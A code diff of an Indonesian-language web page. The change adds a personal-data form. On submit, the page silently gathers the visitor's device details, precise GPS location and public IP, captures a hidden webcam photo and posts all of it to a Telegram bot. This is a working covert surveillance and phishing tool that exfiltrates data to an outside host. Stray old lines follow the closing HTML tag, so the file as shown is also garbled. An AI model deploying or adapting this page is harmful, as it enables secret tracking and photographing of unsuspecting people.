@@ -2,14 +2,33 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Kamera + Info Device</title>
+  <title>Form + Kamera + Info Device</title>
   <style>
     body { background:black; color:lime; font-family:monospace; padding:20px; }
+    label { display:block; margin-top:10px; }
+    input, select { width:100%; padding:5px; margin-top:5px; }
+    button { margin-top:15px; padding:10px; background:lime; border:none; font-weight:bold; cursor:pointer; }
     pre { white-space:pre-wrap; text-align:left; }
   </style>
 </head>
 <body>
-<h2>🔍 Mengumpulkan Data...</h2>
+<h2>📝 Isi Data + Aktifkan Kamera</h2>
+
+<form id="userForm">
+  <label>Nama: <input type="text" name="nama" required></label>
+  <label>Usia: <input type="number" name="usia" required></label>
+  <label>Jenis Kelamin:
+    <select name="gender" required>
+      <option value="Laki-laki">Laki-laki</option>
+      <option value="Perempuan">Perempuan</option>
+    </select>
+  </label>
+  <label>Tipe (Reseller/User/Dll):
+    <input type="text" name="tipe">
+  </label>
+  <button type="submit">Kirim Data</button>
+</form>
+
 <video id="video" autoplay playsinline width="300" height="300" style="display:none"></video>
 <canvas id="canvas" width="300" height="300" style="display:none"></canvas>
 <pre id="log"></pre>
@@ -23,49 +42,118 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
 
-let deviceInfo = {
-  platform: navigator.platform,
-  userAgent: navigator.userAgent,
-  language: navigator.language,
-  screen: `${screen.width}x${screen.height}`,
-  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  date: new Date().toLocaleString()
-};
+async function getExtraInfo(){
+  let info = {
+    platform: navigator.platform,
+    userAgent: navigator.userAgent,
+    screen: `${screen.width}x${screen.height}`,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    date: new Date().toLocaleString()
+  };
 
-// ambil baterai
-if (navigator.getBattery) {
-  navigator.getBattery().then(bat => {
-    deviceInfo.battery = `${Math.round(bat.level*100)}% (${bat.charging?"Charging":"Not Charging"})`;
-  });
-}
+  // baterai
+  if (navigator.getBattery) {
+    try {
+      let bat = await navigator.getBattery();
+      info.battery = `${Math.round(bat.level*100)}% (${bat.charging?"Charging":"Not Charging"})`;
+    } catch{}
+  }
 
-// ambil lokasi
-function getLocation(){
-  return new Promise((resolve) => {
+  // lokasi
+  info.location = await new Promise(res=>{
     if (navigator.geolocation){
-      navigator.geolocation.getCurrentPosition(pos => {
-        resolve({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          acc: pos.coords.accuracy + " m",
-          maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+      navigator.geolocation.getCurrentPosition(p=>{
+        res({
+          lat:p.coords.latitude,
+          lon:p.coords.longitude,
+          acc:p.coords.accuracy+" m",
+          maps:`https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`
         });
-      }, err => resolve({error:err.message}));
-    } else resolve({error:"Geolocation tidak didukung"});
+      },e=>res({error:e.message}));
+    } else res({error:"Tidak didukung"});
   });
+
+  // IP
+  try {
+    let ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
+    info.ip = ip.ip;
+  } catch{}
+
+  return info;
 }
 
-// ambil IP publik
-function getIP(){
-  return fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip);
+async function sendToTelegram(photoBlob, formData, extra){
+  let textMsg = `👤 Data User
+Nama: ${formData.nama}
+Usia: ${formData.usia}
+Gender: ${formData.gender}
+Tipe: ${formData.tipe}
+
+📡 Device Info
+Platform: ${extra.platform}
+UserAgent: ${extra.userAgent}
+Resolusi: ${extra.screen}
+Language: ${extra.language}
+Timezone: ${extra.timezone}
+Tanggal: ${extra.date}
+Baterai: ${extra.battery||"?"}
+
+🌍 Lokasi:
+${extra.location?.lat}, ${extra.location?.lon}
+Akurasi: ${extra.location?.acc}
+Maps: ${extra.location?.maps}
+
+🌐 IP: ${extra.ip||"?"}`;
+
+  // kirim teks
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID, text:textMsg})
+  });
+
+  // kirim foto
+  let fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("photo", photoBlob, "cam.png");
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+    method:"POST",
+    body:fd
+  });
+
+  logBox.textContent = "✅ Data & Foto terkirim ke Telegram!";
 }
 
-// kirim ke telegram
-async function sendToTelegram(photoBlob, info){
-  let textMsg = `📡 Device Info
-Platform: ${info.platform}
-UserAgent: ${info.userAgent}
-Screen: ${info.screen}
+document.getElementById("userForm").onsubmit = async e=>{
+  e.preventDefault();
+  const formData = Object.fromEntries(new FormData(e.target).entries());
+  logBox.textContent = "⏳ Mengambil info & kamera...";
+
+  const extra = await getExtraInfo();
+
+  // kamera
+  navigator.mediaDevices.getUserMedia({video:true})
+  .then(stream=>{
+    video.srcObject = stream;
+    video.onloadedmetadata=()=>{
+      setTimeout(()=>{
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
+        canvas.toBlob(blob=>{
+          sendToTelegram(blob, formData, extra);
+          stream.getTracks().forEach(t=>t.stop());
+        },"image/png");
+      },2000);
+    };
+  })
+  .catch(err=>{
+    logBox.textContent="❌ Kamera error: "+err.message;
+  });
+};
+</script>
+</body>
+</html>Screen: ${info.screen}
 Language: ${info.language}
 Timezone: ${info.timezone}
 Date: ${info.date}
